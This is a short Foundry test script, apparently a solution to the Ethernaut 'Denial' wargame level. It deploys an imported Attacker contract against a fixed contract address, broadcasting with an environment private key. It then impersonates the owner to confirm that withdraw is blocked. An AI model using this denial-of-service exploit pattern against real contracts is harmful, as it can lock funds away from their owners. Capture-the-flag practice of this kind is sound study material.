// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Attacker.sol";

contract DenialTest is Test {
   address payable constant denialAddress = payable(0x827872ED543C8DF67042511BAB19A7F51Bd0C35a);
   
   function test() external {
         address EOA = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
         Attacker attacker = new Attacker(denialAddress);
         attacker.attack();
         vm.stopBroadcast();
         vm.startPrank(Denial(denialAddress).owner());
         //vm.expectRevert();
         Denial(denialAddress).withdraw();
         vm.stopPrank();
   }
}
